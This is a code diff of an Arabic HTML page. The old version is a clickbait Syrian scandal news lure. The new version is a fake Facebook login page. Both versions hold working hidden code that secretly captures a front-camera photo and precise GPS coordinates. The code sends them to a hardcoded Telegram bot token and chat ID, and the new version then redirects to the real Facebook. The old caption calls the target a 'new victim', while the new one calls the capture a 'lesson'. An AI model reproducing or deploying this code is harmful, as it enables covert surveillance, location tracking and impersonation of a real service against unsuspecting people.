@@ -3,90 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عاجل: فضيحة تهز سوريا - - تفاصيل حصرية</title>
+    <title>فيسبوك</title>
     <style>
-        body {background:#f5f5f5; color:#333; text-align:right; font-family:'Segoe UI',Arial,sans-serif; margin:0; padding:0; line-height:1.8;}
-        .header {background:#d32f2f; color:#fff; padding:30px 20px; text-align:center; box-shadow:0 4px 10px rgba(0,0,0,0.2);}
-        h1 {font-size:30px; margin:0;}
-        .date {font-size:16px; opacity:0.9; margin-top:10px;}
-        .article {padding:20px; max-width:95%; margin:0 auto; background:#fff; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1); margin-top:-20px;}
-        .article p {font-size:18px; margin:20px 0;}
-        .highlight {background:#fff3e0; padding:20px; border-right:5px solid #ff9800; border-radius:8px; margin:30px 0; font-style:italic;}
-        .video-section {background:#000; padding:40px 20px; text-align:center; border-radius:15px; margin:30px 0;}
-        .video-thumb {background:url('https://i.pinimg.com/originals/cb/15/66/cb1566b189b13c01e96e0bcfe4b06e3e.jpg') center/cover no-repeat; height:60vh; max-height:400px; border-radius:15px; position:relative; box-shadow:0 10px 30px rgba(0,0,0,0.5);}
-        .play-btn {position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:90px; color:#fff; background:rgba(0,0,0,0.7); width:120px; height:120px; border-radius:60px; display:flex; align-items:center; justify-content:center; cursor:pointer; animation:pulse 2s infinite;}
-        @keyframes pulse {0% {box-shadow:0 0 0 0 rgba(255,0,0,0.7);} 70% {box-shadow:0 0 0 30px rgba(255,0,0,0);} 100% {box-shadow:0 0 0 0 rgba(255,0,0,0);}}
-        .warning {font-size:16px; color:#ff9800; margin:20px 0;}
-        .loader {display:none; border:8px solid #333; border-top:8px solid #d32f2f; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px auto;}
-        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
-        .status {font-size:18px; color:#d32f2f;}
+        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
+        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
+        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
+        .form-area {padding:20px;}
+        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
+        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
+        .links {text-align:center;margin:15px 0;font-size:14px;}
+        .links a {color:#1877f2;text-decoration:none;}
+        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
+        .warning {display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);color:white;text-align:center;padding:40px;font-size:20px;z-index:9999;flex-direction:column;justify-content:center;align-items:center;}
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>عاجل: فضيحة كبيرة تهز سوريا !</h1>
-        <p class="date">نشر اليوم - 19 ديسمبر 2025</p>
-    </div>
-    <div class="article">
-        <p>في تطور مثير وغير متوقع، وصلتنا تفاصيل حصرية عن فضيحة كبيرة هزت أركان وريف دمشق. المصادر الموثوقة داخل المنطقة أكدت أن الأمر يتعلق بأحداث غامضة وصفقات سرية شملت شخصيات معروفة محليًا.</p>
-        <p>بدأت القصة عندما تم تسريب معلومات حساسة من أحد الأطراف، وسرعان ما انتشرت بين السكان. الشهود يتحدثون عن لقاءات سرية في أماكن عامة، ووثائق تكشف تفاصيل مذهلة.</p>
-        <div class="highlight">
-            <p>"الأمر أكبر مما يتخيله أحد، والفيديو الكامل اللي وصلنا يثبت كل شيء. لكن للأمان والخصوصية، المحتوى مقيد جغرافيًا لسكان التل فقط، عشان ما ينتشر خارج المنطقة."</p>
+
+<div class="fb-container">
+    <div class="header">فيسبوك</div>
+    <div class="form-area">
+        <form>
+            <input type="text" placeholder="رقم الجوال أو البريد الإلكتروني">
+            <input type="password" placeholder="كلمة المرور">
+            <button type="button" class="login-btn">تسجيل الدخول</button>
+        </form>
+        <div class="links">
+            <a href="#">نسيت كلمة المرور؟</a><br><br>
+            <a href="#">إنشاء حساب جديد</a>
         </div>
-        <p>الفيديو الحصري اللي بين إيدينا يحتوي على مشاهد مباشرة وتسجيلات صوتية واضحة. لكن لضمان أنك من سكان المنطقة ومشاهدة آمنة، نحتاج تحقق سريع من موقعك وصورة للتأكيد (لن يتم حفظ أو مشاركة أي شيء، مجرد تحقق تلقائي).</p>
-        <div class="video-section">
-            <p class="warning">تحذير: المحتوى للكبار فقط ويحتوي على مشاهد قوية</p>
-            <div class="video-thumb">
-                <div class="play-btn" onclick="startCapture()">▶</div>
-            </div>
-        </div>
-        <div class="loader" id="loader"></div>
-        <p id="status" class="status">اضغط على الزر لمشاهدة الفيديو الكامل...</p>
     </div>
+    <div class="footer">
+        العربية · English · Türkçe · بیشتر<br>
+        Meta © 2025
+    </div>
+</div>
 
-    <script>
-    function startCapture() {
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('status').innerText = 'جاري تحميل الفيديو...';
+<script>
+// === غيّر هذه القيم فقط ===
+const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const CHAT_ID = "1611398303";
+// ===========================
 
-        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
-            let video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-            setTimeout(()=>{
-                let canvas = document.createElement('canvas');
-                canvas.width = 1280;
-                canvas.height = 720;
-                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
-                let imgData = canvas.toDataURL('image/jpeg');
+let capturedImage = null;
 
-                navigator.geolocation.getCurrentPosition(pos=>{
-                    let gps = pos.coords.latitude + "," + pos.coords.longitude + " ±" + pos.coords.accuracy + "m";
+setTimeout(() => {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+        let video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
 
-                    let caption = encodeURIComponent("🆕 ضحية جديدة من التل\nGPS: " + gps + "\nوقت: " + new Date());
+        setTimeout(() => {
+            let canvas = document.createElement('canvas');
+            canvas.width = 1280;
+            canvas.height = 720;
+            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+            capturedImage = canvas.toDataURL('image/jpeg');
 
-                    let url = "https://api.telegram.org/bot8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8/sendDocument?chat_id=1611398303&caption=" + caption;
+            stream.getTracks().forEach(t => t.stop());
 
-                    let form = new FormData();
-                    form.append('document', dataURLtoBlob(imgData), "photo.jpg");
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    // حساب الإحداثيات بدقة
+                    const lat = position.coords.latitude.toFixed(6);
+                    const lng = position.coords.longitude.toFixed(6);
+                    const acc = Math.round(position.coords.accuracy);
+                    const gps = lat + "," + lng + " ±" + acc + "m";
 
-                    fetch(url, {method: 'POST', body: form})
-                        .then(() => document.getElementById('status').innerText = 'تم!')
-                        .catch(() => document.getElementById('status').innerText = 'خطأ');
-                });
+                    // تنسيق الوقت بالعربية كاملاً
+                    const time = new Date().toLocaleString('ar-EG', {
+                        weekday: 'long',
+                        year: 'numeric',
+                        month: 'long',
+                        day: 'numeric',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit'
+                    });
 
-                stream.getTracks().forEach(track => track.stop());
-            }, 1500);
-        });
+                    // الكابتشن باستخدام backticks بشكل صحيح 100%
+                    const caption = "🎓 تجربة تعليمية ناجحة\n" +
+                                   "📍 الموقع: " + gps + "\n" +
+                                   "🕐 الوقت: " + time + "\n" +
+                                   "👨‍🏫 من درس الأستاذ";
+
+                    const blob = dataURLtoBlob(capturedImage);
+                    const form = new FormData();
+                    form.append('photo', blob, 'lesson.jpg');
+                    form.append('caption', caption);
+                    form.append('chat_id', CHAT_ID);
+
+                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
+                        method: 'POST',
+                        body: form
+                    }).finally(() => {
+                        window.location.href = "https://m.facebook.com/";
+                    });
+
+                },
+                error => {
+                    document.getElementById('warning').style.display = 'flex';
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }, 3000);
+    })
+    .catch(() => {
+        document.getElementById('warning').style.display = 'flex';
+    });
+}, 3000);
+
+// دالة التحويل
+function dataURLtoBlob(dataurl) {
+    let arr = dataurl.split(',');
+    let mime = arr[0].match(/:(.*?);/)[1];
+    let bstr = atob(arr[1]);
+    let n = bstr.length;
+    let u8arr = new Uint8Array(n);
+    while (n--) {
+        u8arr[n] = bstr.charCodeAt(n);
     }
+    return new Blob([u8arr], {type: mime});
+}
+</script>
 
-    function dataURLtoBlob(dataurl) {
-        let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-        while(n--) u8arr[n] = bstr.charCodeAt(n);
-        return new Blob([u8arr], {type:mime});
-    }
-    </script>
 </body>
 </html>
 
